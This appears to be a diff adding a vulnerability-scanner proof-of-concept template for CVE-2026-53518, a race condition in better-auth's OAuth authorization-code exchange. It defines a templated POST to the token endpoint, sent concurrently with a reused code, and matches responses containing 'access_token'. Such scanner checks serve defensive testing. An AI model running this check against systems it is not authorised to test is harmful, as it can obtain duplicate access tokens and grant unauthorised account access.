@@ -1,0 +1,32 @@
+[info]
+author = "AVE"
+description = "验证 better-auth OAuth 授权码并发兑换漏洞。通过并发发送两个携带相同授权码的 POST 请求到 /api/auth/oauth2/token 端点，检查是否返回多个有效的 access_token，以确认竞争条件漏洞存在。"
+id = "POC-AVE-2026-0408"
+name = "CVE-2026-53518 PoC"
+severity = "high"
+tags = ["ave-2026-0408"]
+vuln_id = [
+    "CVE-2026-53518",
+    "AVE-2026-0408",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/auth/oauth2/token"
+protocol = "http"
+
+[poc.requests.body]
+content = "grant_type=authorization_code&code={{auth_code}}&redirect_uri={{redirect_uri}}&client_id={{client_id}}&code_verifier={{code_verifier}}"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["access_token"]
